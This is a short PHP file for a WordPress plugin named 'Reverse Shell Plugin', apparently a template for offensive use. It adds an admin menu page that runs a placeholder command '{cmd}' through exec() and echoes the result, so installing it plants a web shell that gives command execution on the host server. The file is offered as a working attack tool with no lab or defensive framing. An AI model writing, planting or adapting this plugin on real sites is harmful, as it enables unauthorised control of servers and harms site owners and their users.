<?php
/**
 * Plugin Name: Reverse Shell Plugin
 * Description: Adds a custom admin page under the menu that will be a reverse webshell.
 * Version: 1.0
 * Author: Nicholas
 */

// Hook to add admin menu
add_action('admin_menu', 'reverse_shell_plugin_menu');

function reverse_shell_plugin_menu() {
    add_menu_page(
        'Reverse Shell',               // Page title
        'Reverse Shell',               // Menu title
        'manage_options',            // Capability
        'reverse-shell-plugin',        // Menu slug
        'reverse_shell_plugin_page',   // Function to display page content
        'dashicons-carrot',          // Icon
        20                           // Position
    );
}

function reverse_shell_plugin_page() {
    ?>
    <div class="wrap">
        <h1>Reverse Shell</h1>
        <p>Custom Reverse Shell</p>
    </div>
    <pre>
        <?php 
            $output = null;
            $return = null;
            exec("{cmd}", $output, $return); 
            echo implode("\n", $output);
            if ($return !== 0) {
                echo "Command failed with return code: $return";
            }                          
        ?>
    </pre>
<?php
}